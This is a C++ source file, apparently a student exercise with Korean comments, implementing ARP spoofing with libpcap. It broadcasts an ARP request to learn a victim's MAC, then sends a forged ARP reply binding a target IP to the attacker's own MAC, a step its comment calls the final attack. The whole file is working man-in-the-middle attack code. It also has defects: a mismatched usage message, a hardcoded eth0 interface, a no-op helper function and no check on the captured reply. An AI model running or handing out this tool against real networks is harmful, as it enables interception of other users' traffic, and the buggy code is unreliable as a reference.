#include <cstdio>
#include <stdio.h>
#include <ifaddrs.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"


void getmymac(u_char* mymac);
void getmyIP(char* myIP);
void send_arp_packet( char* packet_eth_dmac, char* packet_eth_smac,  int arphdr_option, char* packet_arp_smac, char* packet_arp_sip,char* packet_arp_tmac, char* packet_arp_tip,  pcap_t* handle);
void get_sender_mac(const u_char* packet2, u_char* sender_mac);


#pragma pack(push, 1)
struct EthArpPacket final {
   EthHdr eth_;
   ArpHdr arp_;
};
#pragma pack(pop)

EthArpPacket packet;


void usage() {
   printf("syntax: send-arp-test <interface>\n");
   printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
   if (argc != 4) {
      usage();
      return -1;
   }

   char* dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
   if (handle == nullptr) {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }

   //edit
   u_char mymac[6]; 
   char my_mac[20];
   char myIP[20];
   char your_mac[20];
   char *sender_IP;
   char *target_IP;
   u_char *sender_mac;
   char broad[20] = "ff:ff:ff:ff:ff:ff";
   char unknown[20] = "00:00:00:00:00:00";

   sender_IP = argv[2];
   target_IP = argv[3];

   //내 맥, 아이피 알아내기
   getmymac(mymac);
   sprintf(my_mac, "%02x:%02x:%02x:%02x:%02x:%02x", mymac[0], mymac[1], mymac[2], mymac[3], mymac[4], mymac[5]);
   getmyIP(myIP);
   printf("IP : %s\n", myIP);

   //상대 ip주소 활용해서 arp 보내기
   send_arp_packet(broad,my_mac,1, my_mac, myIP,unknown , sender_IP, handle);

   //패킷 받아서 센더의 맥어드레스 알아내기
   struct pcap_pkthdr* header;
   const u_char* arp_reply_packet;
   int res = pcap_next_ex(handle, &header, &arp_reply_packet);
   
   if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
      printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
      return -1;
   }
   //get_sender_mac(arp_reply_packet, sender_mac);
   EthArpPacket* sender_packet;
   sender_packet = (EthArpPacket*) arp_reply_packet;
   sender_mac = (u_char*)sender_packet->arp_.smac_;
   sprintf(your_mac, "%02x:%02x:%02x:%02x:%02x:%02x", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);
   printf("%s\n",your_mac);
   
   //알아낸 정보들로 최종 공격하기
   send_arp_packet(your_mac, my_mac,2,my_mac, target_IP, your_mac, sender_IP, handle);
   //edit 

   pcap_close(handle);
}

void getmymac(u_char* mymac)
{
   int fd;
    struct ifreq ifr;
    const char *iface = "eth0";
    char *mac = NULL;

    memset(&ifr, 0, sizeof(ifr));

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr)) {
        mac = (char *)ifr.ifr_hwaddr.sa_data;

        //display mac address
        //printf("Mac : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }
   for(int i = 0; i<6; i++)
   {
      mymac[i] = mac[i];
   }
   printf("Mac : %02hhX:%02hhX:%02hhX:%02hhX:%02hhX:%02hhX\n", mymac[0], mymac[1], mymac[2], mymac[3], mymac[4], mymac[5]);


    close(fd);

    return;
}


void getmyIP(char* IP)
{
   int fd;
   struct ifreq ifr;
   
 
   char iface[] = "eth0";
   
   fd = socket(AF_INET, SOCK_DGRAM, 0);

   ifr.ifr_addr.sa_family = AF_INET;

   strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

   ioctl(fd, SIOCGIFADDR, &ifr);

   close(fd);

    sprintf(IP, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

   //printf("%s : %s\n" , iface , inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr) );
   //memcpy(IP, (unsigned char*)(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr )->sin_addr)), sizeof(IP));
   

   return;
}

void send_arp_packet( char* packet_eth_dmac, char* packet_eth_smac,  int arphdr_option, char* packet_arp_smac, char* packet_arp_sip,char* packet_arp_tmac, char* packet_arp_tip, pcap_t* handle)
{

   packet.eth_.dmac_ = Mac(packet_eth_dmac);
   packet.eth_.smac_ = Mac(packet_eth_smac);
   packet.eth_.type_ = htons(EthHdr::Arp);

   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet.arp_.pro_ = htons(EthHdr::Ip4);
   packet.arp_.hln_ = Mac::SIZE;
   packet.arp_.pln_ = Ip::SIZE;
   if(arphdr_option == 1)   
   {
      packet.arp_.op_ = htons(ArpHdr::Request); 
   }
   else if(arphdr_option == 2)   
   {
      packet.arp_.op_ = htons(ArpHdr::Reply); 
   }
   else return;

   packet.arp_.smac_ = Mac(packet_arp_smac); //22:22:22:22
   packet.arp_.sip_ = htonl(Ip(packet_arp_sip));
   packet.arp_.tmac_ = Mac(packet_arp_tmac);
   packet.arp_.tip_ = htonl(Ip(packet_arp_tip));

   int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
   if (res != 0) {
      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
   }
}

void get_sender_mac( const u_char* packet2, u_char* sender_mac)
{
   EthArpPacket* sender_packet;
   sender_packet = (EthArpPacket*) packet2;

   sender_mac = (u_char*)sender_packet->arp_.smac_;

   return;
}